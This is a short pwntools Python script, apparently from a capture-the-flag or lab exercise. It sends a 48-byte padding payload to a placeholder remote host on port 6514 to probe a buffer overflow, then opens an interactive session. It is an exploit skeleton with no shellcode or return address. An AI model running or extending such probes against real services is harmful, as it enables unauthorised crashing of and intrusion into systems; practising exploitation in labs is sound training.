#!/usr/bin/env python

from pwn import *

host = '@ip'
port = 6514

# Define the buffer size
buffer_size = 48


payload =  b'A' * buffer_size
# payload =  b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5' 

# Print the length of the payload
print("Payload length:", len(payload), "bytes")

# Establish connection to remote host
s = remote(host, port)

# Send the payload
s.send(payload)

# Start an interactive session
s.interactive()
